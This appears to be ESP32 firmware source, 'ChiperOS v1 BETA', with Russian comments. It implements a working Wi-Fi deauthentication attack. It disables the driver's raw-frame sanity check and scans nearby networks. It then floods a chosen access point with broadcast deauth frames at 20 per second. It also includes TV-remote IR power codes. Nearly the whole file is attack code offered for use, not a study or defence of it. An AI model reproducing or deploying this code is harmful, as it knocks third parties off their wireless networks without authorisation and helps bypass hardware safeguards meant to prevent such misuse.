// ═══════════════════════════════════════════════════════════════
// ChiperOS v1 BETA - Deauth по технологии Bruce
// ═══════════════════════════════════════════════════════════════

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>

#define IR_PIN 4
IRsend irSender(IR_PIN);

#define LG_POWER_CODE 0x20DF0CF3
#define SAMSUNG_POWER_CODE 0xE0E040BF

// ═══════════════════════════════════════════════════════════════
// ВАЖНО: Обход проверки — 3 аргумента для ESP-IDF 5.x
// ═══════════════════════════════════════════════════════════════
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

typedef struct {
    String ssid;
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
} WiFiNetwork;

#define MAX_NETWORKS 30
WiFiNetwork networks[MAX_NETWORKS];
int networkCount = 0;

bool deauthActive = false;
int targetChannel = 1;
uint8_t targetAP[6] = {0};
unsigned long lastDeauth = 0;

// ═══════════════════════════════════════════════════════════════
// Deauth кадр (Bruce style)
// ═══════════════════════════════════════════════════════════════
uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1: Broadcast (target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2: Source (AP MAC)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3: BSSID (AP MAC)
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
};

void printMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", mac[i]);
        if (i < 5) Serial.print(":");
    }
}

void initWiFiForAttack() {
    WiFi.disconnect(true);
    esp_wifi_stop();
    delay(200);
    
    WiFi.mode(WIFI_AP);
    delay(100);
    WiFi.softAP("ChiperOS", "12345678", 1); // Канал 1 для стабильности
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(nullptr); // Отключаем callback
}

void sendDeauthPacket(uint8_t* ap, int channel) {
    // Устанавливаем канал
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Заполняем MAC-адреса AP в кадре
    memcpy(&deauth_frame[10], ap, 6);
    memcpy(&deauth_frame[16], ap, 6);
    
    // КЛЮЧЕВОЙ МОМЕНТ BRUCE: 4-й аргумент = true (enable_system_seq)
    // Это говорит драйверу самому добавить sequence control
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
    
    if (err != ESP_OK) {
        Serial.printf("TX err: %d\n", err);
    }
}

void startDeauth(int networkNum) {
    int idx = networkNum - 1;
    if (idx < 0 || idx >= networkCount) {
        Serial.println("❌ Неверный номер сети");
        return;
    }
    
    targetChannel = networks[idx].channel;
    memcpy(targetAP, networks[idx].bssid, 6);
    
    initWiFiForAttack();
    
    deauthActive = true;
    
    Serial.println("\n🎯 Deauth атака запущена!");
    Serial.printf("   Цель: %s\n", networks[idx].ssid.c_str());
    Serial.printf("   Канал: %d\n", targetChannel);
    Serial.print("   MAC: ");
    printMac(targetAP);
    Serial.println();
    Serial.println("   Команда 'stop' для остановки\n");
}

void stopDeauth() {
    deauthActive = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("⏹ Deauth остановлен");
}

void scanNetworks() {
    Serial.println("\n🔍 Сканирование WiFi сетей...\n");
    
    if (deauthActive) stopDeauth();
    
    WiFi.disconnect(true);
    esp_wifi_stop();
    delay(200);
    WiFi.mode(WIFI_STA);
    delay(100);
    
    int n = WiFi.scanNetworks(false, true, false, 500, 0);
    networkCount = min(n, MAX_NETWORKS);
    
    if (networkCount == 0) {
        Serial.println("❌ Сети не найдены\n");
        return;
    }
    
    Serial.println("╔════╦══════════════════════╦══════╦═══════════════════╗");
    Serial.println("║ №  ║ SSID                 ║ CH   ║ MAC Address       ║");
    Serial.println("╠════╬══════════════════════╬══════╬═══════════════════╣");
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        
        Serial.printf("║ %-2d ║ %-20s ║ %-4d ║ ", 
            i + 1, 
            networks[i].ssid.substring(0, 20).c_str(), 
            networks[i].channel);
        printMac(networks[i].bssid);
        Serial.println(" ║");
    }
    Serial.println("╚════╩══════════════════════╩══════╩═══════════════════╝\n");
    Serial.printf("Найдено сетей: %d\n", networkCount);
    Serial.println("Команда: <номер> deauth (например: 2 deauth)\n");
}

void sendIR_LG_Power() {
    Serial.println("📺 LG TV Power...");
    irSender.sendNEC(LG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(LG_POWER_CODE, 32);
}

void sendIR_Samsung_Power() {
    Serial.println("📺 Samsung TV Power...");
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n╔════════════════════════════════════════╗");
    Serial.println("║    ChiperOS v1 BETA (Bruce-style)      ║");
    Serial.println("║    ESP32-C3 Super Mini                 ║");
    Serial.println("╚════════════════════════════════════════╝\n");
    
    irSender.begin();
    Serial.println("✅ IR ready (GPIO 4)");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    Serial.println("✅ WiFi ready");
    Serial.println("\n📋 COMMANDS: scan, <n> deauth, stop, lg, samsung\n");
}

void loop() {
    if (deauthActive) {
        if (millis() - lastDeauth > 50) { // 20 пакетов/сек как у Bruce
            sendDeauthPacket(targetAP, targetChannel);
            lastDeauth = millis();
        }
    }
    
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        if (cmd.endsWith(" deauth")) {
            int spaceIdx = cmd.indexOf(' ');
            if (spaceIdx > 0) {
                int num = cmd.substring(0, spaceIdx).toInt();
                startDeauth(num);
            }
        }
        else if (cmd == "scan") scanNetworks();
        else if (cmd == "stop") {
            if (deauthActive) stopDeauth();
        }
        else if (cmd == "lg") sendIR_LG_Power();
        else if (cmd == "samsung") sendIR_Samsung_Power();
    }
    
    delay(10);
}
